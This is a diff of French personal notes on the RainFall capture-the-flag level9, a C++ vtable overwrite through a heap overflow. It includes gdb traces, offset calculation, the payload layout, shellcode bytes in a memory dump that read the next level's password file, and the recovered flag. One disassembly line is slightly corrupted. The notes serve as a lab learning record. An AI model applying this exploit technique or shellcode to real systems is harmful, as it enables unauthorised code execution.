@@ -55,7 +55,12 @@ int32_t main(int32_t argc, char** argv, char** envp)
     int32_t sec_object = operator new(0x6c); // 0x6c == 108 octets
     N::N(sec_object, 6); // constructeur
     N::setAnnotation(first_object, argv[1]);
+
     return (**sec_object)(sec_object, first_object);
+OU
+	vptr = sec_object->vptr;
+	fonction = vptr[0];
+	return fonction(sec_object, first_object);
 }
 
 void __static_initialization_and_destruction_0(int32_t arg1, int32_t arg2)
@@ -124,9 +129,9 @@ level9@RainFall:~$
 
 Donc on peut segfault la fonction setAnnotation avec de la memoire malloced
 
-on peut envisager l'injection de shellcode ? 
+on peut envisager l'injection de shellcode ? oui
 
-peut on ecrire sur eip ? 
+peut on ecrire sur eip ? non
 
 /home/user/bonus0/.pass
 
@@ -151,9 +156,7 @@ https://masterccc.github.io/tools/shellcode_gen/
 
 
     return (**sec_object)(sec_object, first_object);
-Vas chercher dans la v table de l'objet N et utiliser la fonction 
-0x0804873a  N::operator+
-0x0804874e  N::operator-
+Vas chercher dans la v table de l'objet N et utiliser la fonction operator+
 
 (gdb) b *0x08048693
 Breakpoint 1 at 0x8048693
@@ -185,7 +188,7 @@ edx            0x804873a        134514490
 
 0x804873a == N::operator+ 
 
-Donc je peut overide la l'adresse de la fonction operator+ 
+Donc je peut overide l'adresse de la fonction operator+ 
 	dans le 2nd objet depuis le memcpy du 1er objet
 
 il faut que je calcul l'offset
@@ -209,7 +212,7 @@ Dump of assembler code for function main:
    0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
    0x0804861c <+40>:    mov    ebx,eax
    0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
-   0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
+   0x08048626 <+50>:    mov    DWORD PTR [esp],	 bx
    0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
    0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
    0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c
@@ -252,24 +255,24 @@ End of assembler dump.
 
 Le constructeur a besoins de this et de arg (un nombre 5 ou 6)
 Donc [esp+0x4]  2nd argument == 0x6 == 6
-Et [esp] == sec_object donc ebx == sec_object
+Et [esp] 1er argument == ebx == sec_object
+	et apres l'execution ebx est stocker dans [esp+0x18]
+	  0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
+	donc first_object est dans [esp+0x1c]
+	
 
-et apres l'execution ebx est stocker dans [esp+0x18]
+	  0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
+	donc esp+0x18 mis dans eax donc eax == sec_object
+	Puis 
+	   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
+	eax dans [esp+0x10] donc sec_object
+	Puis apres setAnnotation 
+	   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
+	[esp+0x10] dans eax a nouveau
 
-   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
 
-donc first_object est dans [esp+0x1c]
-
-plus loin 
-  0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
-donc esp+0x18 mis dans eax donc eax == sec_object
-Puis 
-   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
-eax dans [esp+0x10] donc sec_object
-Puis apres setAnnotation 
-   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
-[esp+0x10] dans eax a nouveau
-
+break *0x0804867c
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 (gdb) x/wx $esp+0x10
 0xbffff650:     0x0804a078
 
@@ -278,13 +281,13 @@ On suit l'adresse 0x0804a078
 0x804a078:      0x41366441
 
 Et on trouve 0x41366441 qui nous donne un offset a 108 avec https://wiremask.eu/tools/buffer-overflow-pattern-generator/
-donc il nous faut un payload qui finisse par l'adresse ou est stocker le shellcodde 
+donc il nous faut un payload qui finisse par l'adresse ou est stocker le shellcode 
 
     return memcpy(&the_object[4], arg, strlen(arg)); // &the_object[4] == (&the_object + 4) on copy apres la vtable
 
 donc l'adresse de first_object + 4 logiquement [esp+0x1c] + 4
 
-MAIS 
+MAIS
 
 il est deplacer d'abord dans eax puis dans [esp+0x14],
    0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
@@ -298,14 +301,119 @@ puis plus tard dans eax
 0xbffff654:     0x0804a008
 (gdb)
 
-donc 0xbffff654 est l'adresse de first_object
-et 
+donc 0x0804a008 est l'adresse de first_object
 
+NOPS + shellcode + first_object addresse [4]
 
-NOPS + shellcodde + first_object addresse [4]
+first_object + 4 = 0x0804a00c
 
 on doit mettre l'addresse de jump dans la case qui contient normalement operator+
-donc il nous faut l'adresse de cette case : 
-on doit avoir l'adresse ou est stocker notre shellcode :
+donc il nous faut l'adresse de cette case (dans sec_object) :
+- sec_object == esp+0x10 + ? = op+ 
+- breakpoint sur pour regarder le pointeur contenue dans eax
+(gdb) break *0x08048684
+Breakpoint 2 at 0x8048684
+(gdb) run AAA
+Starting program: /home/user/level9/level9 AAA
+Breakpoint 2, 0x08048684 in main ()
+(gdb) x/wx $eax
+0x8048848 <_ZTV1N+8>:   0x0804873a
+(gdb) x/4wx 0x08048848
+0x8048848 <_ZTV1N+8>:   0x0804873a      0x0804874e      0x00004e31      0x08049b88
+donc 0x8048848 est l'adresse qui contient operator+
+
+on doit y mettre l'adresse ou est stocker notre shellcode :
+- il est copier dans the_object[4] donc first_object + 4 octets
+- donc [esp+0x1c] + 4 == [esp+0x1c+0x4]
+ (gdb)  x/wx $esp+0x1c+0x4
+0xbffff660:     0x08048770
+- 0xbffff660
+
+
+trouver l'offset pour atteindre 0x8048848:
+0x8048848 n'est pas dans second object1
+je dois plutot atteindre et modifier le vptr qui menne a la vtable pour 
+- y placer une adresse qui elle meme pointe sur une adresse de mon buffer 
+- qui contiens l'adresse de debut de mon shellcode
+
+
 
 creer la payload
+
+Total de 108 octets:
+addresse_shellcode + NOPS + shellcode + addresse de addresse_shellcode 
+	4o				44o			60o					4o
+
+
+level9@RainFall:/tmp$ nano scrypt.py                                                                                              
+level9@RainFall:/tmp$ python scrypt.py > pay
+level9@RainFall:/tmp$ ls
+pay  scrypt.py
+level9@RainFall:/tmp$ cd
+level9@RainFall:~$ ./level9 $(cat /tmp/pay)
+level9@RainFall:~$
+
+(gdb) run $(cat /tmp/pay)
+Starting program: /home/user/level9/level9 $(cat /tmp/pay)
+
+Breakpoint 1, 0x08048682 in main ()
+(gdb) x/wx $eax
+0x8048848 <_ZTV1N+8>:   0x0804873a
+(gdb) p/x $eax
+$1 = 0x8048848
+(gdb) x/wx 0x0804a078
+0x804a078:      0x08048848
+(gdb) x/120bx 0x0804a00c
+0x804a00c:      0x10    0xa0    0x04    0x08    0x31    0xc0    0x50    0x68
+0x804a014:      0x2f    0x63    0x61    0x74    0x68    0x2f    0x62    0x69
+0x804a01c:      0x6e    0x89    0xe3    0x50    0x68    0x70    0x61    0x73
+0x804a024:      0x73    0x68    0x30    0x2f    0x2f    0x2e    0x68    0x6f
+0x804a02c:      0x6e    0x75    0x73    0x68    0x65    0x72    0x2f    0x62
+0x804a034:      0x68    0x65    0x2f    0x75    0x73    0x68    0x2f    0x68
+0x804a03c:      0x6f    0x6d    0x89    0xe1    0x50    0x51    0x53    0x89
+0x804a044:      0xe1    0x31    0xc0    0x83    0xc0    0x0b    0xcd    0x80
+0x804a04c:      0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0x804a054:      0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0x804a05c:      0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0x804a064:      0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0x804a06c:      0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0x804a074:      0x0c    0xa0    0x04    0x08    0x48    0x88    0x04    0x08
+0x804a07c:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+(gdb) x/wx 0x0804a00c
+0x804a00c:      0x0804a010
+(gdb) x/wx 0x0804a00c+104
+0x804a074:      0x0804a00c
+(gdb) x/wx 0x0804a00c+108
+0x804a078:      0x08048848
+(gdb)
+
+
+dans 0x0804a00c qui est la ou memcpy commence a copier on voit ma paylaod d'abord \x10\xa0\x04\x08
+puis le shellcode, puis les nops, puis 0x0c 0xa0 0x04 0x08
+
+(gdb) x/wx 0x0804a00c+104
+0x804a074:      0x0804a00c
+
+donc 0x0804a00c est a 104o alors qu'il devrais etre a 108
+
+en augmentant les nops de 4 dans le scrypt (40 -> 44)
+level9@RainFall:~$ ./level9 $(cat /tmp/pay2)
+Segmentation fault (core dumped)
+
+mais j'ai bien 
+(gdb) x/wx 0x0804a078
+0x804a078:      0x0804a00c
+(gdb)
+
+edx n'est pas set a null dans le shellcode 
+https://defuse.ca/online-x86-assembler.htm#disassembly
+converti assembly en opcode/bytecode "xor %edx,%edx" = "\x31\xD2"
+
+qu'on ajoute devant \xcd\x80
+
+et on adapte les nops 
+
+
+level9@RainFall:~$ ./level9 $(cat /tmp/pay)
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+level9@RainFall:~$
